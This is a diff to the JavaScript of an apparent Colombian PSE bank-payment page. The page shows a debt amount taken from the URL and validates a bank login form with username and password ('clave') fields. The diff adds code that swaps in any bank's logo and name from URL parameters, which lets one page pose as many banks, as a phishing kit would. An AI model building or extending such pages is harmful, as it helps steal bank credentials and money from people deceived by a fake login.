@@ -206,7 +206,9 @@
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const deudaTotal = parseFloat(urlParams.get('deuda'));
-            
+            const bankLogoUrl = urlParams.get('logo'); // Nuevo: obtener la URL del logo
+            const bankName = urlParams.get('banco'); // Opcional: obtener el nombre del banco
+
             const formatCurrency = (amount) => {
                 return new Intl.NumberFormat('es-CO', {
                     style: 'currency',
@@ -224,6 +226,15 @@
                 console.error("No se encontraron parámetros de deuda válidos en la URL.");
             }
 
+            if (bankLogoUrl) {
+                const pseLogo = document.getElementById('pse-logo');
+                pseLogo.src = decodeURIComponent(bankLogoUrl);
+                if (bankName) {
+                    const readableBankName = bankName.charAt(0).toUpperCase() + bankName.slice(1);
+                    pseLogo.alt = `Logo de ${readableBankName}`;
+                }
+            }
+
             const bankLoginForm = document.getElementById('bank-login-form');
             const loaderContainer = document.getElementById('loader-container');
 
@@ -232,7 +243,7 @@
                 let isValid = true;
                 document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
                 document.querySelectorAll('input').forEach(el => el.classList.remove('input-error'));
-                
+
                 const user = document.getElementById('user');
                 const clave = document.getElementById('clave');
 
